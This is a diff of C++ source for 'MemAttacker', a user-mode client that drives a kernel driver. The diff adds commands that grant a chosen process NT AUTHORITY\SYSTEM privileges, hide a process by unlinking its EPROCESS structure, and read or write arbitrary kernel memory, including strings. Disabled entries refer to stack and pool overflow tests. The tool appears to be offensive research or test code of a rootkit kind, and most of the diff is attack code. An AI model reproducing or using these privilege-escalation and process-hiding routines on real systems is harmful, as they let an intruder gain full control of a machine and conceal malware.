@@ -2,7 +2,25 @@
 #include <iomanip>
 namespace mem_attacker {
 
-	/*  */
+	/* Set NT AUTHORITY\\SYSTEM privileges to the process */
+	bool MemAttacker::set_priv() {
+		ULONG64 proc_id = 0; cin >> std::dec >> proc_id;
+		bool b_res =
+			scm_manager.send_ctrl_code(MEM_ATTACKER_SET_PRIVS, (LPVOID)&proc_id, sizeof ULONG64, NULL, 0, 0);
+
+		return b_res;
+	}
+
+	/* Hide the process by unlinking EPROCESS structure, yep it causes 0x109 BSOD */
+	bool MemAttacker::hide_proc() {
+		ULONG64 proc_id = 0; cin >> std::dec >> proc_id;
+		bool b_res =
+			scm_manager.send_ctrl_code(MEM_ATTACKER_HIDE_PROCESS, (LPVOID)&proc_id, sizeof ULONG64, NULL, 0, 0);
+
+		return b_res;
+	}
+
+	/* Read a byte from the memory address */
 	bool MemAttacker::read_1byte(){
 		ADDR_BYTE addr_byte = { 0 };
 		std::cin >> std::hex >> addr_byte.addr;
@@ -21,7 +39,7 @@ namespace mem_attacker {
 		return b_res;
 	}
 
-	/*  */
+	/* Write a byte to the memory address */
 	bool MemAttacker::write_1byte(){
 		ADDR_BYTE addr_byte = { 0 };
 		std::cin >> std::hex >> addr_byte.addr;
@@ -41,7 +59,7 @@ namespace mem_attacker {
 		return b_res;
 	}
 
-	/*  */
+	/* Write 8 bytes to the memory */
 	bool MemAttacker::write_8bytes(){
 		ADDR_BYTE addr_byte = { 0 };
 		std::cin >> std::hex >> addr_byte.addr;
@@ -52,24 +70,54 @@ namespace mem_attacker {
 
 		return b_res;
 	}
+	
 
-	/*  */
-	bool MemAttacker::hide_proc(){
-		ULONG64 proc_id = 0; cin >> std::dec >> proc_id;
-		bool b_res =
-			scm_manager.send_ctrl_code(MEM_ATTACKER_HIDE_PROCESS, (LPVOID)&proc_id, sizeof ULONG64, NULL, 0, 0);
 
+	/* Read a char string from the memory */
+	bool MemAttacker::read_char_data() {
+		bool b_res = false;
+		ALLOCATED_DATA data = { 0 };
+		std::cin >> std::hex >> data.address;
+		b_res =
+			scm_manager.send_ctrl_code(MEM_ATTACKER_READ_CHAR_DATA, (LPVOID)&data, sizeof ALLOCATED_DATA, NULL, 0, 0);
+		if (b_res) {
+			cout << "  We've just read  \"" << data.content << "\"  from  "
+				<< hex << uppercase << data.address << endl;
+		}
 		return b_res;
 	}
 
-	/*  */
-	bool MemAttacker::set_priv() {
-		ULONG64 proc_id = 0; cin >> std::dec >> proc_id;
-		bool b_res =
-			scm_manager.send_ctrl_code(MEM_ATTACKER_SET_PRIVS, (LPVOID)&proc_id, sizeof ULONG64, NULL, 0, 0);
-
+	bool check_input(char *input) {
+		bool b_res = false;
+		size_t len = strlen(input);
+		for (size_t i = 0; i < len; i++) {
+			b_res = isgraph(input[i]) || isspace(input[i]);
+			if (!b_res) { break; }
+		}
+		if (!b_res) {
+			cout << "  The input string:  \"" << input << "\"  is wrong, try again!" << endl;
+		}
 		return b_res;
 	}
+
+	/* Write a char string to the memory */
+	bool MemAttacker::write_char_data() {
+		bool b_res = false;
+		ALLOCATED_DATA data = { 0 };
+		std::cin >> std::hex >> data.address;
+		cin.ignore(); // ignore one whitespace between the command and params
+		cin.getline(data.content, sizeof(data.content));
+		if (check_input(data.content)) {
+			b_res =
+				scm_manager.send_ctrl_code(MEM_ATTACKER_WRITE_CHAR_DATA, &data, sizeof ALLOCATED_DATA, NULL, 0, 0);
+			if (b_res) {
+				cout << "  We've just written  \"" << data.content << "\"  to the  "
+					<< hex << uppercase << data.address << endl;
+			}
+		}
+		return b_res;
+	}
+	
 
 	bool MemAttacker::run_simple_stack_overflow(){
 		DWORD bufferSz = 0; std::cin >> std::dec >> bufferSz;
@@ -226,14 +274,20 @@ namespace mem_attacker {
 		'_read1' -- start and set temp loop
 		'_write1' -- stop loop
 		'basic' -- run basic memory accesses
-		'exit' -- exit this app
-		'q' -- fast quit
+		'q' --  quit
 		*/
 		
-		add_unique_command("_read1", &mem_attacker::MemAttacker::read_1byte, " <Address>  ' -- read 1 byte from memory <Address>");
-		add_unique_command("_write1", &mem_attacker::MemAttacker::write_1byte, " <Address> <Value in hex>' -- write 1 byte to memory <Address>");
-		add_unique_command("_hide", &mem_attacker::MemAttacker::hide_proc, " <ProcessId in dec> ' --  hide process with <ProcessId> by unlinking");
-		add_unique_command("_priv", &mem_attacker::MemAttacker::set_priv, " <ProcessId in dec> ' --  set NT AUTHORITY\\SYSTEM privs for <ProcessId>");
+		add_unique_command("hide", &mem_attacker::MemAttacker::hide_proc, " <ProcessId in dec> ' --  hide process with <ProcessId> by unlinking");
+		add_unique_command("priv", &mem_attacker::MemAttacker::set_priv, " <ProcessId in dec> ' --  set NT AUTHORITY\\SYSTEM privs for <ProcessId>");
+
+		add_unique_command("read_byte", &mem_attacker::MemAttacker::read_1byte, " <Address>  ' -- read 1 byte from memory <Address>");
+		add_unique_command("write_byte", &mem_attacker::MemAttacker::write_1byte, " <Address> <Value in hex>' -- write 1 byte to memory <Address>");
+		
+		add_unique_command("read_data",
+			&mem_attacker::MemAttacker::read_char_data, " <addr>' -- read char[] data from <addr> ");
+
+		add_unique_command("write_data",
+			&mem_attacker::MemAttacker::write_char_data, " <addr> <char[]>' -- write char[] data to <addr> ");
 
 		//add_unique_command("write8", &mem_attacker::MemAttacker::write_8bytes, " <Address> <Value in hex>' -- write 8 bytes to memory <Address>");
 		//add_unique_command("test_stack", &mem_attacker::MemAttacker::run_simple_stack_overflow, " <BufferSize>' -- test stack overflow with <BufferSize>");
@@ -243,12 +297,13 @@ namespace mem_attacker {
 		//add_unique_command("test_pool", &mem_attacker::MemAttacker::test_pool_allocations, "' -- test pool functions");
 		//add_unique_command("pool", &mem_attacker::MemAttacker::run_pool_overflow, " <BufferSize>' -- test pool overflow with <BufferSize>");
 		//add_unique_command("exit", NULL, "' -- exit this app ");
-		add_unique_command("q", NULL, "' -- quit");
+		
+		add_unique_command("x", NULL, "' -- exit this app");
 	}
 
 	void print_supported_commands() {
 		std::cout << endl;
-		cout << "MemAttacker accesses kernel-mode memory illegally :[ " << endl;
+		cout << "MemAttacker accesses kernel-mode code & data illegally :[ " << endl;
 		for (const auto & item : g_CommandsList) {
 			cout << " '" << item.first << item.second.key_definition << endl;
 		}
